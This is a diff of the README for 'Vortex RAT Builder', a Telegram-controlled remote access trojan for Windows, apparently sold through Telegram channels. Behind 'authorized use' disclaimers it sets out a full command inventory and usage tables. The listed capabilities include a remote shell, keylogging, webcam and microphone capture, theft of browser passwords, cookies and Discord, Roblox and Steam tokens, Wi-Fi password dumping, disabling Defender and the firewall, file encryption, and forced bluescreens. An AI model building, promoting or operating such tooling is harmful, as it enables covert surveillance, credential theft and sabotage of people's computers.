@@ -2,9 +2,9 @@
 
 Vortex RAT Builder is a professional, open-source builder project for authorized device management, security research, and controlled lab testing. It combines a polished Windows builder UI with Telegram bot configuration, making it easier to configure, package, and manage authorized remote administration builds from one place.
 
-**Official website:** [vortexcodes.org](https://vortexcodes.org)
+Official website: [vortexcodes.org](https://vortexcodes.org)
 
-> **Important:** Vortex RAT Builder must only be used for systems you own or have explicit permission to administer. Do not install, run, monitor, or collect data from any device without clear authorization.
+> Important: Vortex RAT Builder must only be used for systems you own or have explicit permission to administer. Do not install, run, monitor, or collect data from any device without clear authorization.
 
 ## Project Status
 
@@ -64,6 +64,10 @@ After a successful build, Vortex RAT Builder shows the output executable path an
 
 When an authorized build connects, the configured Telegram admin receives a status card with device context such as user, host, OS, admin state, IP details, and uptime.
 
+### Command Preview
+
+The Telegram `/help` menu organizes commands by category inside the bot. For a public-safe command list with usage examples, see the full [Command Reference](#command-reference) section below. Sensitive command-menu screenshots are intentionally not embedded in this README because they expose high-risk actions that should only be handled in private authorized lab documentation.
+
 ## Core Features
 
 ### Telegram-Based Control
@@ -109,7 +113,6 @@ Highlights:
 - Windows service listing.
 - Idle time reporting.
 - Lock, sleep, shutdown, restart, and logoff actions.
-- Startup persistence management.
 
 ### File Management
 
@@ -168,7 +171,7 @@ Vortex RAT Builder includes optional data-audit modules intended for controlled 
 Highlights:
 
 - Browser credential audit support.
-- Cookie/session inventory support (single site or all cookies).
+- Cookie/session inventory support.
 - Public IP and geolocation lookup.
 - Discord token audit support.
 - Roblox account/session audit support.
@@ -184,7 +187,7 @@ The network module helps inspect connectivity and local Windows network state.
 Highlights:
 
 - Nearby Wi-Fi network listing.
-- Saved Wi-Fi profile review (credentials).
+- Saved Wi-Fi profile review.
 - Local IP configuration output.
 - Active connection listing.
 - Hosts-file based site block and unblock support.
@@ -226,3 +229,261 @@ Install dependencies:
 
 ```bash
 pip install -r requirements.txt
+```
+
+Run the builder:
+
+```bash
+python builder.py
+```
+
+## Command Reference
+
+Send `/help` to the configured Telegram bot after an authorized device connects to see the in-app command list.
+
+The commands below are documented for authorized administration, support, and lab use. Commands that collect credentials, capture private activity, create persistence, disable security tools, or deliberately destabilize a machine are intentionally not documented with usage instructions in this public README.
+
+### Complete Command Inventory
+
+```text
+System:
+/shell
+/admincheck
+/sysinfo
+/whoami
+/datetime
+/shutdown
+/restart
+/logoff
+/lock
+/sleep
+/listprocess
+/prockill
+/idletime
+/installed
+/services
+/startup
+/rmstartup
+/devices
+
+Files:
+/cd
+/dir
+/currentdir
+/download
+/upload
+/uploadlink
+/delete
+/drives
+/search
+/encrypt
+/decrypt
+/copy
+/move
+/rename
+/mkdir
+/openfile
+
+Interaction:
+/message
+/fakeerror
+/voice
+/write
+/wallpaper
+/website
+/audio
+/popup
+/volumeup
+/volumedown
+/mute
+/monitors_off
+
+Capture:
+/screenshot
+/clipboard
+/setclipboard
+/getcams
+/selectcam
+/webcampic
+/record
+/keylog
+/stopkeylog
+
+Data Collection:
+/cookies
+/allcookies
+/passwords
+/geolocate
+/tokens
+/roblox
+/steam
+
+Network:
+/wifilist
+/wifipasswords
+/ipconfig
+/netstat
+/env
+
+Control:
+/blocksite
+/unblocksite
+/disabletaskmgr
+/enabletaskmgr
+/disabledefender
+/enabledefender
+/disablefirewall
+/enablefirewall
+/hidetaskbar
+/showtaskbar
+/hidedesktop
+/showdesktop
+/swap_mouse
+/unswap_mouse
+/bluescreen
+/critproc
+/switch
+/clearregistry
+
+General:
+/exit
+```
+
+### General
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/start` | `/start` | Confirm that the authorized device is connected. |
+| `/help` | `/help` | Show the command list inside Telegram. |
+| `/exit` | `/exit` | Stop the running client process. |
+
+### Device Sessions
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/devices` | `/devices` | List online authorized devices registered to the bot. |
+| `/switch` | `/switch <session_number>` | Switch control to another connected authorized session. |
+| `/clearregistry` | `/clearregistry` | Reset the local Vortex session registry used for device tracking. |
+
+### System Information
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/admincheck` | `/admincheck` | Check whether the client is running with administrator privileges. |
+| `/sysinfo` | `/sysinfo` | Display detailed system, hardware, OS, and usage information. |
+| `/whoami` | `/whoami` | Show the current Windows user context. |
+| `/datetime` | `/datetime` | Show the device date and time. |
+| `/idletime` | `/idletime` | Show how long the user session has been idle. |
+| `/listprocess` | `/listprocess` | List running processes. |
+| `/prockill` | `/prockill <process_name>` | Terminate a named process on an authorized device. |
+| `/installed` | `/installed` | List installed programs. |
+| `/services` | `/services` | List Windows services and their status. |
+
+### Power And Session Control
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/lock` | `/lock` | Lock the workstation. |
+| `/sleep` | `/sleep` | Put the machine into sleep mode. |
+| `/shutdown` | `/shutdown` | Shut down the machine. |
+| `/restart` | `/restart` | Restart the machine. |
+| `/logoff` | `/logoff` | Log off the active Windows session. |
+
+### File Management
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/currentdir` | `/currentdir` | Show the current working directory. |
+| `/cd` | `/cd <path>` | Change the current working directory. |
+| `/dir` | `/dir` | List files and folders in the current directory. |
+| `/drives` | `/drives` | List mounted drives. |
+| `/search` | `/search <name>` | Search for files matching a name. |
+| `/download` | `/download <file_path>` | Send an authorized file from the device to Telegram. |
+| `/upload` | Attach a file with caption `/upload` | Save an attached Telegram file to the current directory. |
+| `/uploadlink` | `/uploadlink <url> <file_name>` | Download a file from a URL to the authorized device. |
+| `/copy` | `/copy <source> <destination>` | Copy a file. |
+| `/move` | `/move <source> <destination>` | Move a file. |
+| `/rename` | `/rename <old_path> <new_path>` | Rename a file or folder. |
+| `/mkdir` | `/mkdir <path>` | Create a folder. |
+| `/openfile` | `/openfile <path>` | Open a file with the default Windows handler. |
+| `/delete` | `/delete <path>` | Delete a file or folder on an authorized device. |
+| `/encrypt` | `/encrypt <file_path> <key>` | Encrypt a selected file with the provided key. |
+| `/decrypt` | `/decrypt <file_path> <key>` | Decrypt a selected file with the provided key. |
+
+### User Interaction
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/message` | `/message <text>` | Display a message box. |
+| `/fakeerror` | `/fakeerror <text>` | Display a custom error dialog for testing. |
+| `/voice` | `/voice <text>` | Speak text using text-to-speech. |
+| `/write` | `/write <text>` | Type text into the active session. |
+| `/wallpaper` | Attach an image with caption `/wallpaper` | Set the attached image as the desktop wallpaper. |
+| `/website` | `/website <url>` | Open a URL in the default browser. |
+| `/audio` | Attach audio with caption `/audio` | Play the attached audio file. |
+| `/popup` | `/popup <count> <text>` | Show repeated popup messages for authorized testing. |
+| `/volumeup` | `/volumeup` | Increase system volume. |
+| `/volumedown` | `/volumedown` | Decrease system volume. |
+| `/mute` | `/mute` | Toggle mute. |
+| `/monitors_off` | `/monitors_off` | Turn off connected monitors. |
+
+### Capture And Diagnostics
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/screenshot` | `/screenshot` | Capture the current screen. |
+| `/clipboard` | `/clipboard` | Show clipboard text. |
+| `/setclipboard` | `/setclipboard <text>` | Set clipboard text. |
+| `/getcams` | `/getcams` | List available camera indexes. |
+| `/selectcam` | `/selectcam <index>` | Select which camera index to use. |
+| `/webcampic` | `/webcampic` | Capture an image from the selected camera with consent. |
+| `/record` | `/record <seconds>` | Record microphone audio for a limited duration with consent. |
+
+### Network Diagnostics
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/wifilist` | `/wifilist` | List nearby Wi-Fi network names. |
+| `/ipconfig` | `/ipconfig` | Show local network adapter configuration. |
+| `/netstat` | `/netstat` | Show active network connections. |
+| `/env` | `/env` | Show environment variables for diagnostics. |
+| `/geolocate` | `/geolocate` | Show public IP geolocation information. |
+| `/blocksite` | `/blocksite <domain>` | Add a domain block entry on an authorized system. |
+| `/unblocksite` | `/unblocksite <domain>` | Remove a domain block entry on an authorized system. |
+
+### Desktop Visibility
+
+| Command | Usage | Description |
+| --- | --- | --- |
+| `/hidetaskbar` | `/hidetaskbar` | Hide the Windows taskbar. |
+| `/showtaskbar` | `/showtaskbar` | Show the Windows taskbar. |
+| `/hidedesktop` | `/hidedesktop` | Hide desktop icons. |
+| `/showdesktop` | `/showdesktop` | Show desktop icons. |
+| `/swap_mouse` | `/swap_mouse` | Swap left and right mouse buttons. |
+| `/unswap_mouse` | `/unswap_mouse` | Restore normal mouse button behavior. |
+
+### Sensitive Commands
+
+The codebase contains additional high-risk commands related to credential/session collection, keyboard logging, startup persistence, security-control changes, and crash/critical-process testing. Because those capabilities can harm users when misused, this README does not provide operational usage instructions for them. Only use or document those modules in private, authorized lab environments, and remove them before publishing a public build.
+
+## Responsible Use
+
+Vortex RAT Builder is a powerful administration builder. By using it, you agree to the following rules:
+
+- Use it only on devices you own or have explicit permission to manage.
+- Do not use it for unauthorized access, surveillance, credential theft, harassment, or evasion.
+- Do not deploy it silently or deceptively.
+- Tell users what is being installed, what it can access, and how it can be removed.
+- Follow all laws and platform rules in your country or region.
+
+The author and contributors are not responsible for misuse, damage, illegal activity, or policy violations caused by this software.
+
+## Support
+
+For help, updates, custom requests, or purchase questions:
+
+- DM: [t.me/highoncodes](https://t.me/highoncodes)
+- Channel: [t.me/VortexPremiumRat](https://t.me/VortexPremiumRat)
+- Website: [vortexcodes.org](https://vortexcodes.org)
+
+Thank you for supporting Vortex RAT Builder and the Vortex Codes community.
